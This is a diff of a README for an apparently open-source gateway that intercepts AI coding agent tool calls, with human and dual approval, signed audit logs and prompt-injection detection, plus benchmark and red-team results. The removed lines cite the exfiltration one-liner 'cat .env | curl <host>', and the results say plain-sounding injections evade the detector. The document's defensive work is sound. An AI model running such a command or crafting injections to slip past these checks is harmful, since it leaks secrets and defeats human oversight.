@@ -6,30 +6,36 @@
 
 ## What it does
 
-- **Intercepts every tool call** via Claude Code hooks and an MCP server, and returns **allow / observe / escalate / deny**, with an itemized, explainable risk score.
-- **Keeps the agent unprivileged:** approved commands run in a broker outside the agent, and only the output goes back to it.
-- **Produces examiner-grade evidence:** Ed25519-signed approvals and a SHA-256 hash-chained audit log. Critical actions need **dual control**: two approvals by different reviewers with different keys, each signed, before anything runs.
-- **Detects intent, not just keywords** (optional, fully local): [jev-os](https://github.com/Boredem125/jev-os), my open-source CPU-only zero-shot model engine, scans what the agent *reads* (READMEs, web pages, tool output) sentence by sentence for prompt injection. On a hit, the folder is tainted and even allowlisted shell and network actions need a human.
-- **Catches data exfiltration** in commands (a sensitive source plus a network egress) and requires two approvers, with the reason shown.
-- **Governance-as-code:** plain-language policy clauses ("no customer data to external services"), each mapped to EU AI Act / GDPR / SR 11-7 references, with a `test` command that **measures each clause's reliability** before you trust it.
+- **Intercepts every tool call** (shell, file, web and MCP) via Claude Code hooks and an MCP server, and returns **allow / observe / escalate / deny** with an itemized, explainable risk score.
+- **Keeps the agent unprivileged:** approved commands run in a broker outside the agent. For third-party MCP calls the sandbox can't make itself, a human approves the exact call and the agent's identical retry is allowed once.
+- **Dual control:** critical actions (e.g. a command that sends `.env` out) need two approvals by different reviewers with different keys, each signed.
+- **Detects intent, not just keywords** (optional, local): a small distilled classifier plus [jev-os](https://github.com/Boredem125/jev-os) zero-shot checks scan what the agent *reads* for prompt injection, sentence by sentence. On a hit, even allowlisted shell and network actions need a human.
+- **Governance-as-code:** plain-language clauses ("no moving money without human review") mapped to EU AI Act / GDPR / SR 11-7 references, checked on shell commands and on MCP/WebFetch calls, with a `test` command that measures each clause before you trust it.
+- **Governance records:** versioned policies with second-reviewer change control and drift protection, a signed evidence pack for auditors, oversight metrics with approval-fatigue detection, and dev/staging/prod plus data-classification rules.
 
 **Design rule:** models may only *raise* scrutiny. Deterministic rules stay in charge, so a fooled model means an extra approval, never an open door.
 
-## Results (measured on a laptop CPU)
+## Results (measured, laptop CPU)
 
-| Benchmark (held out) | Keyword rules (before) | Semantic layer |
-|---|---|---|
-| deepset, genuine attacks | 0/39 caught | **26/39**, 1/56 false alarms |
-| neuralchemy (942 texts) | 156/552 | **324/552** (399 combined with the keyword rules) |
-| Injections in repo files (600) | 60/309, 39 false alarms | **86/309, 8 false alarms** |
+Prompt injection in what the agent reads, held-out sets (caught, false alarms):
 
-- A content-hash cache makes a repeated scan **~330× faster** (2 s → 6 ms).
-- The semantic layer found and fixed a real allowlist hole: `cat .env | curl <host>` used to run silently.
-- **Honest limits:** zero-shot detection misses many attacks (28% recall on repo-file injections). It's a tripwire on top of authorization, not a guarantee. Full numbers and caveats are in [benchmarks/injection](benchmarks/injection/README.md).
+| Set | Keyword rules (before) | jev-os checks | Shipped (jev-os OR student) |
+|---|---|---|---|
+| Injections in repo files (600) | 60/309, 39/291 | 86/309, 8/291 | **256/309, 14/291** |
+| deepset, genuine attacks | 0/39, 0/56 | 26/39, 1/56 | **31/39, 1/56** |
+| neuralchemy (942 texts) | 156/552, 3/390 | 324/552, 86/390 | **525/552, 96/390** |
+
+- Governance on MCP/WebFetch calls: 16/20 violations caught, 0/24 benign calls flagged (frozen test set).
+- Red team: 10 of 113 evasive attacks still get through, all plain-sounding instructions with no AI wording. That case is left to the authorization layer.
+- Every adoption decision used a rule written before the test run; two candidates that missed their rule were not shipped. Full numbers, method and limits: [the write-up](docs/INTENT_AWARE_AUTHORIZATION.md).
+
+## Security of the gateway itself
+
+CI runs Semgrep, Gitleaks, Trivy and a ZAP API scan on every push, with SARIF upload and a severity gate. Fixed along the way: an unauthenticated HTTP API that let anyone approve and run commands, an endpoint that would pull and run any Docker image, and every real 500 ZAP found. See [SECURITY.md](SECURITY.md).
 
 ## Tech
 
-Python 3.12 · FastAPI · MCP · Claude Code hooks · ONNX Runtime · Pydantic · PyNaCl (Ed25519) · pytest (293 tests)
+Python 3.12 · FastAPI · MCP · Claude Code hooks · ONNX Runtime · Pydantic · PyNaCl (Ed25519) · pytest (482 tests)
 
 ## Quick start
 
@@ -39,12 +45,14 @@ sandbox init . --claude --mcp      # connect a folder
 sandbox watch .                    # approve escalations in another terminal
 ```
 
+Useful commands: `sandbox verify` (audit chains), `sandbox explain <id>`, `sandbox oversight`, `sandbox export-evidence --out pack.zip`, `sandbox policy history`.
+
 Optional intent-aware layer: `pip install -e ".[semantic]"`, then `jevos serve` and `sandbox semantic enable .`
 
 ## Docs
 
-[Write-up: intent-aware authorization](docs/INTENT_AWARE_AUTHORIZATION.md) · [Full details](docs/DETAILS.md) · [Threat model](docs/THREAT_MODEL.md) · [Governance-as-code](docs/GOVERNANCE.md) · [Compliance mapping](docs/COMPLIANCE_MAP.md) · [Benchmarks](benchmarks/injection/README.md)
+[Write-up: intent-aware authorization](docs/INTENT_AWARE_AUTHORIZATION.md) · [Full details](docs/DETAILS.md) · [Threat model](docs/THREAT_MODEL.md) · [Governance-as-code](docs/GOVERNANCE.md) · [Evidence pack](docs/EVIDENCE.md) · [Data and environment](docs/DATA_AND_ENVIRONMENT.md) · [Compliance mapping](docs/COMPLIANCE_MAP.md) · [Benchmarks](benchmarks/injection/README.md)
 
-*Compliance mappings show design intent, not certification.*
+*Compliance mappings show design intent, not certification. No software is "compliant" on its own; organisations are.*
 
 Licensed under [MIT](LICENSE).
